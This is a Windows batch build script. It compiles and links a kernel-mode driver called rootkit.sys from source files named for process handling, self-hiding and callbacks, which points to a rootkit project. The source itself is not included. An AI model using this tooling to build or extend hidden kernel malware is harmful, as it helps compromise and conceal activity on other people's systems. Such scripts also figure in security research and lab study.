@echo off
setlocal
cd /d "%~dp0"

set MSVC=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.51.36231
set COMPILER="%MSVC%\bin\Hostx64\x64\cl.exe"
set LINKER="%MSVC%\bin\Hostx64\x64\link.exe"

set WDK_INC=C:\Program Files (x86)\Windows Kits\10\Include\10.0.28000.0\km
set WDK_SHARED=C:\Program Files (x86)\Windows Kits\10\Include\10.0.28000.0\shared
set WDK_UCRT=C:\Program Files (x86)\Windows Kits\10\Include\10.0.28000.0\ucrt
set WDK_LIB=C:\Program Files (x86)\Windows Kits\10\Lib\10.0.28000.0\km\x64
set MSVC_INC=%MSVC%\include

set OUT=.\obj
if not exist %OUT% mkdir %OUT%

echo [*] Compiling...

%COMPILER% ^
  /kernel /GS- /GR- /GL- /Gm- /EHa- ^
  /O1 /W3 /WX- ^
  /D _AMD64_ /D _WIN64 /D NDEBUG ^
  /I "%WDK_INC%" /I "%WDK_SHARED%" /I "%WDK_UCRT%" /I "%MSVC_INC%" ^
  /Fo"%OUT%\\" ^
  /c rootkit.c process.c selfhide.c callbacks.c

if errorlevel 1 (
    echo [!] Compile failed.
    exit /b 1
)

echo [*] Linking...

%LINKER% ^
  /DRIVER:WDM ^
  /SUBSYSTEM:NATIVE,6.1 ^
  /NODEFAULTLIB ^
  /ENTRY:DriverEntry ^
  /INCREMENTAL:NO ^
  /MERGE:_PAGE=PAGE /MERGE:_TEXT=.text /MERGE:.rdata=.text ^
  /SECTION:INIT,d ^
  /OUT:.\rootkit.sys ^
  /LIBPATH:"%WDK_LIB%" ^
  ntoskrnl.lib hal.lib ^
  "%OUT%\rootkit.obj" "%OUT%\process.obj" "%OUT%\selfhide.obj" "%OUT%\callbacks.obj"

if errorlevel 1 (
    echo [!] Link failed.
    exit /b 1
)

echo [+] Done: rootkit.sys
